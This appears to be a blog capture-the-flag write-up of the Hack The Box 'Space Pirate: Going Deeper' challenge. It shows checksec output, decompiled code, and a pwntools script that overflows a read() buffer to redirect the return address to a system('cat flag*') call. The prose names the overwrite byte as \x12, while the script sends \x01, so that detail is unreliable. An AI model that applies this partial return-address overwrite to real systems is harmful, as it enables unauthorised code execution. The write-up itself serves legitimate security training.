---
title: "Binary Exploitation Writeup - Space Pirate: Going Deeper"
published: true
date: 2025-02-06 00:00:00 +/-0000
categories: [general,ctf]
tags: [ctf,htb,binexp,binary exploitation,reverse engineering]     # TAG names should always be lowercase
image:
    path: /assets/images/malware.jpg
---

# HTB - Space Pirate: Going Deeper

This was a pretty standard buffer overflow exercise. Rated "Very Easy" by Hack The Box, this `pwn` binary was a pretty cut-and-dry exercise (with the only real points of friction being the unstable connection to the remote instance).

This challenge - like other `pwn` challenges - isn't shipped with its source code, so one of the first tasks we need to go about is understanding it's underlying behavior. Like in other similar problems. Our preliminary checks include a cursory `file` review:

```bash
file ./sp_going_deeper

sp_going_deeper: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e9d96fdc1091d36833c62c12aa64d686730493eb, not stripped
```

As well as running the binary through `checksec`:

```bash
checksec --file=sp_going_deeper
```

|Check|Value|[Implication](https://opensource.com/article/21/6/linux-checksec)|
|---|---|---|
|RELRO|Full RELRO| Relocation Read-Only; ELF's use Global Offset Table (GOT) to resolve functions. Being FULL, the binary is read-only, mitigating relocation attacks.|
|STACK CANARY| No canary found | Canaries are values placed between a buffer and control data on the stack to monitor buffer overflows. Their absence suggests we might be able to perform BOF. |
|NX| NX enabled | The Non-Executable bit is set. This prevents the execution of code injected via BOF. |
|PIE| No PIE | Position-Independent Executable; code placed in memory regardless of its absolute address. Since it's disabled, the base addresses aren't randomized (use `objdump`)|
|RPATH| No RPATH | This is tied to privilege escalation; essentially, we could place a malicious version of the binary in the relative path - this isn't relevant to `pwn`. |
|RUNPATH| RW-RUNPATH | This is tied to privilege escalation; essentially, we could place a malicious version of the binary in the relative path - this isn't relevant to `pwn` |
|Symbols| 77 symbols | At compile time, certain symbols may be retained to help with debugging. This checks out with the "not stripped" response from our `file` command ran above.|
|FORTIFY| No | This refers to "FORTIFY_source"; specifically geared towards preventing basic buffer overflows and format string vulnerabilities. A "No" indicates these may be viable.|
|Fortifiable| 2 | The number of functions within the binary that could benefit from `FORTIFY`. |
|FILE| sp_goin_deeper | The binary in question. |

Opening the binary in `ghidra` to review the decompiled source code shows a limited `main()` function:

```c
undefined8 main(void)

{
  setup();
  banner();
  puts("\x1b[1;34m");
  admin_panel(1,2,3);
  return 0;
}
```
The `setup()`, `banner()`, and `puts()` calls are all just preliminary fluff, setting up ASCII art, etc. The real meat-and-potatoes of the binary rests in `admin_panel()`:

```c
void admin_panel(long param_1,long param_2,long param_3)

{
  int iVar1;
  char local_38 [40];
  long local_10;
  
  local_10 = 0;
  printf("[*] Safety mechanisms are enabled!\n[*] Values are set to: a = [%x], b = [%ld], c = [%ld]. \n[*] If you want to continue, disable the mechanism or login as admin.\n"
         ,param_1,param_2,param_3);
  while (((local_10 != 1 && (local_10 != 2)) && (local_10 != 3))) {
    printf(&DAT_004014e8);
    local_10 = read_num();
  }
  if (local_10 == 1) {
    printf("\n[*] Input: ");
  }
  else {
    if (local_10 != 2) {
      puts("\n[!] Exiting..\n");
                    /* WARNING: Subroutine does not return */
      exit(0x1b39);
    }
    printf("\n[*] Username: ");
  }
  read(0,local_38,0x39);
  if (((param_1 == 0xdeadbeef) && (param_2 == 0x1337c0de)) && (param_3 == 0x1337beef)) {
    iVar1 = strncmp("DRAEGER15th30n34nd0nly4dm1n15tr4t0R0fth15sp4c3cr4ft",local_38,0x34);
    if (iVar1 != 0) {
      printf("\n%s[+] Welcome admin! The secret message is: ",&DAT_00400c38);
      system("cat flag*");
      goto LAB_00400b38;
    }
  }
  printf("\n%s[-] Authentication failed!\n",&DAT_00400c40);
LAB_00400b38:
  puts("\n[!] For security reasons, you are logged out..\n");
  return;
}
```

## Buffer Overflow

The vulnerability in this process rests with the `read(0, local_38, 0x39)` call. The value `0x39` is hex for 57, which is more than what `local_38` is allocated (40). This allows for a buffer overflow to take place. However, the overflow is pretty well constrained. Testing it with payloads of "A" and then "B" shows that we only really control the last byte of the `ret` address (in this case from 0x41 "A" to 0x42 "B"):

![alt text](/assets/images/ret-overflow.png)

With this in mind, we're constrained to addresses in the `0x400bXX` space. Fortunately looking over the assembly reveals a great option here:

```
        00400b12 48 8d 3d        LEA        RDI,[s_cat_flag*_004015be]                       = "cat flag*"
                 a5 0a 00 00
        00400b19 e8 e2 fb        CALL       <EXTERNAL>::system                               int system(char * __command)
                 ff ff
```

The first loads the "cat flag" string into RDI (which in 64-bit systems is the placeholder for the first argument for function calls), then the second is a `system()` call to perform that operation. Therefore, we can construct our exploit trivially by having the 57th byte replace with `\x12`, thereby jumping to 0x400b12. Our exploit thus looks like:

```python
#!/usr/bin/env python3
import sys
from pwn import *
context.update(arch='amd64', os='linux')

binstr = "./sp_going_deeper"
address_port_str = "94.237.54.42:35233"
ip, port_str = address_port_str.split(":")
port = int(port_str)

#    break *0x56555d36
if (len(sys.argv)<= 1):
    p = process(binstr)
elif (sys.argv[1] == "dbg"):
    p = gdb.debug([binstr],'''
    unset env LINES
    unset env COLUMNS
    break *0x400aba
    continue
    ''')
elif (sys.argv[1] == "remote"):
    p = remote(ip,port)
else:
    print(f"Invalid argument to e.py: '{sys.argv[1]}'. Did you mean 'dbg'?")
    sys.exit(1)

payload = b''
payload += b'A' * 56
payload += b'\x01'

p.sendlineafter(b'\n>> ', b'1')
p.sendline(payload)

p.interactive()
```

The one bit that was frustrating was that the exploit performed inconsistently. While everything worked locally, I had to perform this exploit *many* times over the remote connection before it worked. Not sure what was happening; some people said the connection was unstable, but I'm not sure.
